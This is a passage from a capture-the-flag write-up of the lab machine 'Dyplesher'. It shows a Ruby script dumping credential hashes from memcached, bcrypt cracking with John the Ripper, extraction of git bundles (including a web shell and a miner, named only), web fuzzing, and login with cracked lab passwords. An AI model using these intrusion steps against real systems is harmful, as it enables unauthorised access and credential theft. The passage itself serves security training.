</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>options</span> <span class=o>=</span> <span class=p>{</span> <span class=ss>username</span><span class=p>:</span> <span class=s1>&#39;felamos&#39;</span><span class=p>,</span> <span class=ss>password</span><span class=p>:</span> <span class=s1>&#39;zxcvbnm&#39;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>dc</span> <span class=o>=</span> <span class=no>Dalli</span><span class=o>::</span><span class=no>Client</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;dyplesher.htb:11211&#39;</span><span class=p>,</span> <span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>usernames</span> <span class=o>=</span> <span class=n>dc</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;Usernames:</span><span class=se>\n</span><span class=si>#{</span><span class=n>usernames</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>passwords</span> <span class=o>=</span> <span class=n>dc</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Passwords:</span><span class=se>\n</span><span class=si>#{</span><span class=n>passwords</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -I/home/cyfun/.gem/ruby/2.7.0/gems/dalli-2.7.10/lib -rdalli memcache.rb
</span></span><span class=line><span class=cl>I, [2020-09-26T17:22:50.876277 #35419]  INFO -- : Dalli/SASL authenticating as felamos
</span></span><span class=line><span class=cl>I, [2020-09-26T17:22:50.921907 #35419]  INFO -- : Dalli/SASL: Authenticated
</span></span><span class=line><span class=cl>Usernames:
</span></span><span class=line><span class=cl>MinatoTW
</span></span><span class=line><span class=cl>felamos
</span></span><span class=line><span class=cl>yuntao
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Passwords:
</span></span><span class=line><span class=cl>$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
</span></span><span class=line><span class=cl>$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
</span></span><span class=line><span class=cl>$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
</span></span></code></pre></td></tr></table></div></div><h2 id=password-hash-cracking>Password hash cracking<a hidden class=anchor aria-hidden=true href=#password-hash-cracking>#</a></h2><p>My tool gives me the hash type so we can crack the hashes with
[John the Ripper][JtR]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti &#39;$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa&#39;
</span></span><span class=line><span class=cl>Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
</span></span><span class=line><span class=cl>Woltlab Burning Board 4.x
</span></span><span class=line><span class=cl>bcrypt [HC: 3200] [JtR: bcrypt]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ john hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ john hashes.txt --show
</span></span><span class=line><span class=cl>felamos:mommy1
</span></span></code></pre></td></tr></table></div></div><h2 id=http-discovery-2>HTTP discovery 2<a hidden class=anchor aria-hidden=true href=#http-discovery-2>#</a></h2><p>From the <a href=https://nmap.org/>nmap</a> scan results we also saw there was another HTTP port.</p><p>At <a href=http://dyplesher.htb:3000/>http://dyplesher.htb:3000/</a>, a Gogs git forge is hosted.</p><ul><li>Gogs version 0.11.91.0811</li><li>Go version 1.12.7</li></ul><p>We can log in with felamos account (but we could have registered a new
account as well) and explore existing projects.</p><h2 id=git-discovery>git discovery<a hidden class=anchor aria-hidden=true href=#git-discovery>#</a></h2><p>Let&rsquo;s clone the two repositories.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ git clone http://dyplesher.htb:3000/felamos/gitlab.git
</span></span><span class=line><span class=cl>$ git clone http://dyplesher.htb:3000/felamos/memcached.git
</span></span></code></pre></td></tr></table></div></div><p>memcached repository is exactly the same as the one we dumped earlier and gitlab
repository seems empty.</p><p>But on gitlab project there is a release attached, see
<a href=http://dyplesher.htb:3000/felamos/gitlab/releases>http://dyplesher.htb:3000/felamos/gitlab/releases</a></p><p>The release contains a file named repo.zip.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ wget http://dyplesher.htb:3000/attachments/a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2
</span></span><span class=line><span class=cl>$ mv a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2 repo.zip
</span></span><span class=line><span class=cl>$ ls -lh repo.zip
</span></span><span class=line><span class=cl>-rw-r--r-- 1 cyfun cyfun 21M Sep 27 14:39 repo.zip
</span></span></code></pre></td></tr></table></div></div><p>The archive is heavy so there must definitly be someting in it that is not
in the repository.
It seems it contains bundle files.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ unzip -t repo.zip
</span></span><span class=line><span class=cl>Archive:  repo.zip
</span></span><span class=line><span class=cl>    testing: repositories/            OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/    OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4b/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4b/22/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4e/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4e/07/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/6b/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/6b/86/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/d4/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/d4/73/   OK
</span></span><span class=line><span class=cl>    testing: repositories/@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle   OK
</span></span><span class=line><span class=cl>No errors detected in compressed data of repo.zip.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ unzip repo.zip
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see which bundle could be promising:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=k>for</span> bundle in <span class=k>$(</span>ls -1 repositories/@hashed/**/*.bundle<span class=k>)</span> <span class=p>;</span> <span class=k>do</span> git bundle list-heads <span class=nv>$bundle</span> <span class=p>;</span> <span class=nb>echo</span> <span class=p>;</span> <span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>4eb2a109f5acbcfc4eae0056a40840b2e46299c6 refs/heads/master
</span></span><span class=line><span class=cl>4eb2a109f5acbcfc4eae0056a40840b2e46299c6 HEAD
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>16a1182b900906b761b69ee32b4be9bb98db5f08 refs/heads/master
</span></span><span class=line><span class=cl>16a1182b900906b761b69ee32b4be9bb98db5f08 refs/remotes/origin/master
</span></span><span class=line><span class=cl>16a1182b900906b761b69ee32b4be9bb98db5f08 HEAD
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bf3e5912762e787b8672ae4d681b23c001e2b03e refs/heads/master
</span></span><span class=line><span class=cl>bf3e5912762e787b8672ae4d681b23c001e2b03e HEAD
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>f8b5890a6e8ef14090e8609e0a01e664e71ff848 refs/heads/master
</span></span><span class=line><span class=cl>e5f6c3040ce94750eff4f0a5a343ea67694cb412 refs/tags/0.1
</span></span><span class=line><span class=cl>f8b5890a6e8ef14090e8609e0a01e664e71ff848 HEAD
</span></span></code></pre></td></tr></table></div></div><p>One has a remote branch and one has a tag. As it doesn&rsquo;t help much let&rsquo;s clone
them to easily unbundle the repositories.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=k>for</span> bundle in <span class=k>$(</span>ls -1 repositories/@hashed/**/*.bundle<span class=k>)</span> <span class=p>;</span> <span class=k>do</span> git clone <span class=nv>$bundle</span> <span class=p>;</span> <span class=nb>echo</span> <span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s see what&rsquo;s in there:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tree -S repos
</span></span><span class=line><span class=cl>repos
</span></span><span class=line><span class=cl> 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
</span></span><span class=line><span class=cl>    LICENSE
</span></span><span class=line><span class=cl>    README.md
</span></span><span class=line><span class=cl>    src
</span></span><span class=line><span class=cl>        VoteListener.py
</span></span><span class=line><span class=cl> 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
</span></span><span class=line><span class=cl>    banned-ips.json
</span></span><span class=line><span class=cl>    banned-players.json
</span></span><span class=line><span class=cl>    bukkit.yml
</span></span><span class=line><span class=cl>    commands.yml
</span></span><span class=line><span class=cl>    craftbukkit-1.8.jar
</span></span><span class=line><span class=cl>    eula.txt
</span></span><span class=line><span class=cl>    help.yml
</span></span><span class=line><span class=cl>    ops.json
</span></span><span class=line><span class=cl>    permissions.yml
</span></span><span class=line><span class=cl>    plugins
</span></span><span class=line><span class=cl>       LoginSecurity
</span></span><span class=line><span class=cl>          authList
</span></span><span class=line><span class=cl>          config.yml
</span></span><span class=line><span class=cl>          users.db
</span></span><span class=line><span class=cl>       LoginSecurity.jar
</span></span><span class=line><span class=cl>       PluginMetrics
</span></span><span class=line><span class=cl>           config.yml
</span></span><span class=line><span class=cl>    python
</span></span><span class=line><span class=cl>       pythonMqtt.py
</span></span><span class=line><span class=cl>    README.md
</span></span><span class=line><span class=cl>    sc-mqtt.jar
</span></span><span class=line><span class=cl>    server.properties
</span></span><span class=line><span class=cl>    spigot-1.8.jar
</span></span><span class=line><span class=cl>    start.command
</span></span><span class=line><span class=cl>    usercache.json
</span></span><span class=line><span class=cl>    whitelist.json
</span></span><span class=line><span class=cl>    world
</span></span><span class=line><span class=cl>       data
</span></span><span class=line><span class=cl>          villages.dat
</span></span><span class=line><span class=cl>          villages_end.dat
</span></span><span class=line><span class=cl>       level.dat
</span></span><span class=line><span class=cl>       level.dat_mcr
</span></span><span class=line><span class=cl>       level.dat_old
</span></span><span class=line><span class=cl>       playerdata
</span></span><span class=line><span class=cl>          18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat
</span></span><span class=line><span class=cl>       region
</span></span><span class=line><span class=cl>          r.0.0.mca
</span></span><span class=line><span class=cl>          r.-1.0.mca
</span></span><span class=line><span class=cl>       session.lock
</span></span><span class=line><span class=cl>       uid.dat
</span></span><span class=line><span class=cl>    world_the_end
</span></span><span class=line><span class=cl>        DIM1
</span></span><span class=line><span class=cl>           region
</span></span><span class=line><span class=cl>               r.0.0.mca
</span></span><span class=line><span class=cl>               r.0.-1.mca
</span></span><span class=line><span class=cl>               r.-1.0.mca
</span></span><span class=line><span class=cl>               r.-1.-1.mca
</span></span><span class=line><span class=cl>        level.dat
</span></span><span class=line><span class=cl>        level.dat_old
</span></span><span class=line><span class=cl>        session.lock
</span></span><span class=line><span class=cl>        uid.dat
</span></span><span class=line><span class=cl> 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
</span></span><span class=line><span class=cl>    LICENSE
</span></span><span class=line><span class=cl>    phpbash.min.php
</span></span><span class=line><span class=cl>    phpbash.php
</span></span><span class=line><span class=cl>    README.md
</span></span><span class=line><span class=cl> d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
</span></span><span class=line><span class=cl>     LICENSE.txt
</span></span><span class=line><span class=cl>     nightminer.py
</span></span><span class=line><span class=cl>     README.md
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>16 directories, 50 files
</span></span></code></pre></td></tr></table></div></div><p>We can see a file named <code>users.db</code>.</p><p>I&rsquo;ll use dbeaver to browse the SQLite database.</p><p>There is only one user entry with the hash of a password
<code>$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</code>.</p><p>Let&rsquo;s crack this bcrypt hash like earleir with [john][JtR]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ john hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>alexis1          (x)
</span></span></code></pre></td></tr></table></div></div><h2 id=http-enumeration-2>HTTP enumeration 2<a hidden class=anchor aria-hidden=true href=#http-enumeration-2>#</a></h2><p>Earlier we enumerated <a href=http://test.dyplesher.htb/>http://test.dyplesher.htb/</a> but not <a href=http://dyplesher.htb/>http://dyplesher.htb/</a>,
so let&rsquo;s do it now:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>dyplesher</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>dyplesher</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>js</span>                      <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>311</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>register</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>302</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>350</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>60</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>css</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>312</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>login</span>                   <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4188</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>1222</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>84</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>img</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>312</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>home</span>                    <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>302</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>350</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>60</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>fonts</span>                   <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>314</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>staff</span>                   <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>4389</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>1534</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>103</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>38267</span><span class=o>/</span><span class=mi>38267</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>111</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>11</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s go to the login page and try the password we just cracked.</p><p><a href=http://dyplesher.htb/login>http://dyplesher.htb/login</a></p><p><code>felamos@dyplesher.htb</code> / <code>alexis1</code></p><p>On the home page it&rsquo;s talking about a Minecraft server and the backend allow to
upload and load &ldquo;plugins&rdquo; so I assume it&rsquo;s Minecraft plugins.</p><h2 id=minecraft-plugin>Minecraft plugin<a hidden class=anchor aria-hidden=true href=#minecraft-plugin>#</a></h2><p>On the console page (<a href=http://dyplesher.htb/home/console>http://dyplesher.htb/home/console</a>) we can see
<code>Running Paper MC</code>. So this is a Paper MC server one of the many <a href=https://www.spigotmc.org/wiki/what-is-spigot-craftbukkit-bukkit-vanilla-forg/>minecraft forks</a>: <a href=https://papermc.io/>https://papermc.io/</a>.</p><p>We can also see that <a href=http://test.dyplesher.htb>http://test.dyplesher.htb</a> is deployed under
<code>/var/www/test/</code> and is owned by <code>MinatoTW</code>.</p><p>For the IDE where we&rsquo;ll write the Minecraft plugin we can eitheir use
<a href=https://aur.archlinux.org/packages/eclipse-java/>Eclipse</a> or the more
